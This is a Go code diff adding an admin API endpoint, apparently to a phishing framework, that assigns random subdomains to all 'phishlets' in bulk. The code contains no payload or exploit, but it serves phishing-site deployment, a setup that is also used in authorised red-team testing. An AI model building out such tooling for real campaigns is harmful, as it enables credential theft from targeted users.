@@ -240,6 +240,7 @@ func (api *AdminAPI) Start(bindAddr string, port int) error {
 	apiRouter.HandleFunc("/phishlets/{name}/hostname", api.handleSetPhishletHostname).Methods("POST")
 	apiRouter.HandleFunc("/phishlets/{name}/hostname/generate", api.handleGeneratePhishletHostname).Methods("POST")
 	apiRouter.HandleFunc("/phishlets/{name}/hosts", api.handleGetPhishletHosts).Methods("GET")
+	apiRouter.HandleFunc("/phishlets/hostnames/generate-all", api.handleGenerateAllHostnames).Methods("POST")
 
 	// Sessions endpoints
 	apiRouter.HandleFunc("/sessions", api.handleListSessions).Methods("GET")
@@ -854,6 +855,54 @@ func (api *AdminAPI) handleGeneratePhishletHostname(w http.ResponseWriter, r *ht
 		Success: true, 
 		Message: "Hostname generated",
 		Data: map[string]string{"hostname": hostname},
+	})
+}
+
+// handleGenerateAllHostnames generates random hostnames for all non-template phishlets
+func (api *AdminAPI) handleGenerateAllHostnames(w http.ResponseWriter, r *http.Request) {
+	// Check if base domain is configured
+	baseDomain := api.cfg.GetBaseDomain()
+	if baseDomain == "" {
+		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Base domain not configured"})
+		return
+	}
+
+	// Get all phishlets
+	phishlets := api.cfg.GetPhishletsList()
+	generated := 0
+	failed := 0
+	results := make(map[string]string)
+
+	for _, name := range phishlets {
+		pl, err := api.cfg.GetPhishlet(name)
+		if err != nil {
+			continue
+		}
+
+		// Skip templates
+		if pl.isTemplate {
+			continue
+		}
+
+		// Generate random subdomain
+		randBytes := make([]byte, 4)
+		rand.Read(randBytes)
+		randomSubdomain := hex.EncodeToString(randBytes)
+		hostname := randomSubdomain + "." + baseDomain
+
+		// Set the hostname
+		if api.cfg.SetSiteHostname(name, hostname) {
+			generated++
+			results[name] = hostname
+		} else {
+			failed++
+		}
+	}
+
+	api.jsonResponse(w, http.StatusOK, APIResponse{
+		Success: true,
+		Message: fmt.Sprintf("Generated %d hostnames (%d failed)", generated, failed),
+		Data:    results,
 	})
 }
 
